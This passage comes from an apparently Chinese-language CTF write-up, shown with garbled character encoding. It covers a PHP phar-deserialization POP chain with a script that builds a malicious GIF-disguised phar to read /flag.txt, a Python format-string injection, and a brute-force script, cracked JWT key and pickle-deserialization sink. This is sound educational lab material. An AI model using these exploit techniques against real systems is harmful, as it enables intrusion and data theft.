class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨download.phpä¸­å­˜åœ¨è¿™æ ·çš„ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file-&gt;close();</span><br></pre></td></tr></table></figure>

<p>è¿™ä¼šè§¦å‘file_get_contentsï¼Œå­˜åœ¨pharååºåˆ—åŒ–ï¼æˆ‘ä»¬åªéœ€è¦ä¸Šä¼ ä¸€ä¸ªpharæ–‡ä»¶ç„¶åä¸‹è½½æ–‡ä»¶æ¥pharä¼ªåè®®å³å¯ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ çš„æ˜¯popé“¾ï¼Œæ„é€ æ¶æ„pharæ–‡ä»¶ã€‚</p>
<p>è¿™é‡Œè¦æ³¨æ„Fileä¸­åªæ˜¯returnäº†flag.txtçš„å†…å®¹ï¼Œå¹¶æ²¡æœ‰è¾“å‡ºï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³åŠæ³•å°†å…¶è¾“å‡ºï¼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span>=<span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=<span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//åˆ é™¤ä¹‹å‰çš„test.pharæ–‡ä»¶(å¦‚æœæœ‰)</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//å¼€å§‹ç¼“å†² Phar å†™æ“ä½œ</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="comment">//è®¾ç½®stubï¼Œæ·»åŠ gifæ–‡ä»¶å¤´</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); <span class="comment">//è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);  <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">////åœæ­¢ç¼“å†²å¯¹ Phar å½’æ¡£çš„å†™å…¥è¯·æ±‚ï¼Œå¹¶å°†æ›´æ”¹ä¿å­˜åˆ°ç£ç›˜</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸‹ä¸ºdelete.phpï¼Œåˆ é™¤æ–‡ä»¶æ—¶è§¦å‘unlinkï¼Œä¹Ÿä¼šè§¦å‘pharååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;c75690ab-7f71-4249-9591-3604d9b33f33&#125;</span><br></pre></td></tr></table></figure>





<h2 id="MoeCTF-2021-åœ°ç‹±é€šè®¯"><a href="#MoeCTF-2021-åœ°ç‹±é€šè®¯" class="headerlink" title="[MoeCTF 2021]åœ°ç‹±é€šè®¯"></a>[MoeCTF 2021]åœ°ç‹±é€šè®¯</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162221344.png" alt="image-20241217162221344"></p>
<p>æ•´ç†å¾—åˆ°å¦‚ä¸‹æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request </span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, FLAG </span><br><span class="line"><span class="keyword">import</span> datetime </span><br><span class="line">app = Flask(__name__) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">	f = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r&quot;</span>) </span><br><span class="line">	ctx = f.read() </span><br><span class="line">	f.close() </span><br><span class="line"></span><br><span class="line">	f1ag = request.args.get(<span class="string">&#x27;f1ag&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span> </span><br><span class="line">	exp = request.args.get(<span class="string">&#x27;exp&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span> </span><br><span class="line">	flAg = FLAG(f1ag) </span><br><span class="line">	message = <span class="string">&quot;Your flag is &#123;0&#125;&quot;</span> + exp </span><br><span class="line">	<span class="keyword">if</span> exp == <span class="string">&quot;&quot;</span>: </span><br><span class="line">		<span class="keyword">return</span> ctx </span><br><span class="line">	<span class="keyword">else</span>: </span><br><span class="line">		<span class="keyword">return</span> message.<span class="built_in">format</span>(flAg) </span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: app.run() </span><br></pre></td></tr></table></figure>

<p>å…³é”®çš„åˆ©ç”¨ç‚¹åœ¨message.format(flAg)å’Œmessage &#x3D; â€œYour flag is {0}â€ + exp </p>
<p>è€ƒç‚¹ä¸å‡ºæ„å¤–å°±æ˜¯formatå‡½æ•°</p>
<p>è¿™å…¶å®å¯ä»¥çœ‹åšæ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Your flag is flAg&quot; + exp </span><br></pre></td></tr></table></figure>

<p>ï¼Œåé¢è¿˜æœ‰ä¸ªexpå¯æ§ï¼Œæˆ‘ä»¬è®©ä»–ä¹Ÿä¸º{}ï¼Œé‚£ä¹ˆè¿™ä¸ªå†…å®¹å°±å¯æ§äº†</p>
<p><img src="http://49.232.222.195/usr/uploads/2024/01/3143471657.png" alt="2024-01-24T10:25:56.png"></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162431715.png" alt="image-20241217162431715"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬è®©expä¸ºå¦‚ä¸‹è¯•è¯•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;0.__class__&#125;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162525349.png" alt="image-20241217162525349"></p>
<p>æˆåŠŸï¼Œæ¥ä¸‹æ¥çœ‹globalså³å¯ã€‚</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162550738.png" alt="image-20241217162550738" style="zoom: 67%;" />





<h2 id="CISCN-2019ååŒ—Day1-Web2"><a href="#CISCN-2019ååŒ—Day1-Web2" class="headerlink" title="[CISCN 2019ååŒ—Day1]Web2"></a>[CISCN 2019ååŒ—Day1]Web2</h2><p>æ³¨å†Œä¸€ä¸ªè´¦å·ç„¶åç™»é™†è¿›å…¥å°±è¡Œã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183017666.png" alt="image-20241217183017666"></p>
<p>ikunä»¬å†²å‘€ï¼Œä¸€å®šè¦ä¹°åˆ°lv6</p>
<p>okï¼Œä¸‹é¢æ‰¾lv6å°±è¡Œï¼Œä½†æ˜¯ç¿»äº†å¥½å¤šé¡µéƒ½æ²¡æœ‰ï¼Œå¯èƒ½æ•°å­—å¾ˆå¤§ï¼Œæˆ‘ä»¬çˆ†ç ´ä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node4.anna.nssctf.cn:28454/shop?page=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    target=url+<span class="built_in">str</span>(i)</span><br><span class="line">    res=requests.get(target)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>

<p>180ï¼Œokæ‹¿æ</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183108043.png" alt="image-20241217183108043" style="zoom:67%;" />

<p>å¤©ä»·ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å¯èƒ½è€ƒç‚¹å°±æ˜¯æ”¯ä»˜é€»è¾‘æ¼æ´</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183711068.png" alt="image-20241217183711068"></p>
<p>è¿™é‡Œéœ€è¦adminç”¨æˆ·æ‰è¡Œï¼ŒåŒæ—¶ç»™äº†jwtï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼ªé€ jwtå°±è¡Œï¼Œè¿™é‡Œæˆ‘è¯•äº†å¾ˆå¤šæ–¹æ³•éƒ½ä¸è¡Œï¼Œåæ¥jwtcrackä¸€ä¸‹ç›´æ¥çˆ†ç ´å‡ºäº†å¯†é’¥</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217184946236.png" alt="image-20241217184946236"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1Kun</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217185044193.png" alt="image-20241217185044193"></p>
<p>åœ¨æºä»£ç çœ‹åˆ°<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = <span class="variable language_">self</span>.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åœ¨admin.pyå¤„å‘ç°pickle.loadsï¼Œå­˜åœ¨pickleååºåˆ—åŒ–</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217191850648.png" alt="image-20241217191850648" style="zoom:67%;" />

<p>åŒæ—¶çœ‹ä¸€ä¸‹å¯¹äºè·¯ç”±çš„é…ç½®ï¼Œå¯¹åº”çš„æ˜¯&#x2F;b1g_m4mberè·¯ç”±ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨è¿™ä¸ªè·¯ç”±ä¸‹è¿›è¡Œpickleååºåˆ—åŒ–å³å¯ã€‚</p>
